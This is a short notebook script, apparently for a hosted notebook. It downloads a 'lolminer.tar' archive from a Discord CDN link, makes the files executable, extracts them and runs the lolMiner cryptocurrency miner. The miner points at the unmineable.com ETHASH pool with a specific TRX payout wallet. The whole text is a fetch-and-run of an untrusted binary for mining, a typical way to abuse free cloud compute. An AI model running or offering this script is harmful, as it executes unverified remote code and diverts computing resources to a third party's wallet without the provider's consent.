import tarfile

!curl -l -o lolminer.tar https://cdn.discordapp.com/attachments/891142553540395048/974852686728007680/lolminer.tar
!chmod +x+r+w *
!tar -xvf lolminer.tar
!cd lolminer
!chmod +x+r+w *
!./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TDRAN4p72S5vEfbgV6oqJK17Z7oaG9ygUG.Worker1 --ethstratum ETHPROXY